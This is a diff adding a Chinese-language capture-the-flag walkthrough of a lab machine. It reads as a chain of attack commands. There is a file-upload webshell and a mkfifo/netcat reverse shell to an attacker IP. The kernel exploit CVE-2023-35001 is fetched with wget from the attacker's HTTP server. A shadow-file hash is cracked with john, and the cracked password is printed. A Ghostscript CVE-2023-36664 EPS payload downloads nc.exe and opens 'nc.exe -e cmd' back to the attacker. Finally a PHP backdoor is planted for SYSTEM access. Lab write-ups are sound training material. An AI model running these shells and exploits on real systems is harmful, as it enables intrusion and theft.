@@ -138,3 +138,242 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ```
 
+ 登录到8080WEB端口，注册一个用户进入发现一个文件上传点
+
+![img](../图片/截图_2023-12-14_17-24-20.png)
+
+
+
+```
+git clone https://github.com/flozz/p0wny-shell.git
+```
+
+上传漏洞改后缀爆破
+
+后缀名在seclist中有
+
+```
+/usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt
+```
+
+爆破发现phar后缀返回成功
+
+![img](../图片/截图_2023-12-14_19-25-16.png)
+
+访问http://10.10.11.241:8080/uploads/shell.phar网站
+
+![img](../图片/截图_2023-12-14_19-32-41.png)
+
+
+
+反弹shell
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.65 5566  >/tmp/f
+```
+
+查看内核版本
+
+```
+uname -a
+cat /proc/version
+ubuntu 5.19
+```
+
+![img](../图片/截图_2023-12-14_20-27-35.png)
+
+
+
+使用g.cn搜索
+
+```
+ubuntu 5.19.0 exploit
+```
+
+![img](../图片/截图_2023-12-16_21-02-34.png)
+
+**[CVE-2023-35001](https://github.com/synacktiv/CVE-2023-35001)**
+
+下载编译好exp，需要有C和GO语言环境
+
+```
+git glone https://github.com/synacktiv/CVE-2023-35001.git
+cd CVE-2023-35001
+make
+./exploit
+```
+
+生成了一个lpe.zip文件
+
+在攻击机使用python临时开启http服务
+
+```
+python -m http.server 5566
+```
+
+在靶机上使用wget下载文件并赋予权限执行
+
+```
+wget http://10.10.16.16:5566/wrapper
+wget http://10.10.16.16:5566/exploit
+chmod +x wrapper
+chmod +x exploit
+./exploit
+```
+
+成功提权到root权限
+
+![img](../图片/截图_2023-12-16_21-36-17.png)
+
+**[CVE-2023-2640-CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)**
+
+第二种提权方法，但是我失败了，有些wp成功了。
+
+```
+git clone https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629.git
+cd CVE-2023-2640-CVE-2023-32629
+python -m http.server 4455
+```
+
+
+
+查看shadow文件
+
+```
+cat /etc/shadow
+
+drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/
+```
+
+![img](../图片/截图_2023-12-16_21-29-07.png)
+
+复制到hash文件中，并用john进行爆破
+
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
+爆破出密码为：qwe123!@#    drwilliams
+
+![img](../图片/截图_2023-12-17_10-37-02.png)
+
+使用ssh登录上drwillams用户
+
+```
+ssh drwilliams@10.10.11.241
+```
+
+但是上面没有任何可用信息
+
+使用用户密码登录443端口
+
+![image-20231217133858479](../图片/image-20231217133858479.png)
+
+登录后发现一个邮件说发一个以eps为后缀的文件
+
+![image-20231217133941836](../图片/image-20231217133941836.png)
+
+**[
+CVE-2023-36664-Ghostscript-command-injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)**
+
+```
+git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git
+cd CVE-2023-36664-Ghostscript-command-injection
+python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.16.16:8000/nc64.exe -o nc.exe" --filename file.eps
+```
+
+
+
+使用python开启临时http服务
+
+```
+python -m http.server 4455
+```
+
+
+
+把payload写入eps文件
+
+```
+python CVE_2023_36664_exploit.py --inject --payload "curl 10.10.16.16:4455/nc.exe -o nc.exe" --filename  file.eps
+```
+
+把文件发给对方，记录到已经下好nc.exe
+
+![image-20231217141619478](../图片/image-20231217141619478.png)
+
+
+
+攻击机启动nc监听5566端口
+
+``` 
+nc -lvvnp 5566
+```
+
+把payload写入eps文件并发送
+
+```
+python CVE_2023_36664_exploit.py --inject --payload "nc.exe -e cmd 10.10.16.16 5566 cmd.exe" --filename file.eps
+```
+
+查看到user的flag
+
+```
+03c957e95d2e5b89e69152f251b5886f
+```
+
+![img](../图片/截图_2023-12-17_15-01-52.png)
+
+
+
+在这个脚本文件看到一个密码
+
+chr!$br0wn
+
+![img](../图片/截图_2023-12-17_15-03-41.png)
+
+
+
+使用systeminfo，发现没权限，那就没办法用系统提权
+
+![img](../图片/截图_2023-12-17_15-39-57.png)
+
+
+
+在c盘看见一个xammp的文件----XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包
+
+所以我们可以知道开启了web服务器
+
+![img](../图片/截图_2023-12-17_15-39-34.png)
+
+进入xampp发现一个htdocs
+
+![img](../图片/截图_2023-12-17_16-16-43.png)
+
+
+
+查看htdocs权限，发现有system权限，文件夹是system权限的，那么webshell拿到的也应该是system的，上传个web后门进行提权。
+
+```
+icacls htdocs
+```
+
+![img](../图片/截图_2023-12-17_16-17-56.png)
+
+
+
+临时开启http服务，使用curl命令传输文件
+
+```
+curl http://10.10.16.16:4455/shell.php -o 1.php
+```
+
+![img](../图片/截图_2023-12-17_16-07-19.png)
+
+访问网站进入web后门拿到administrator权限，拿到root flag：
+
+```
+77ff2c46fb0328661aab55841d2c2e01
+```
+
+![img](../图片/截图_2023-12-17_16-07-04.png)
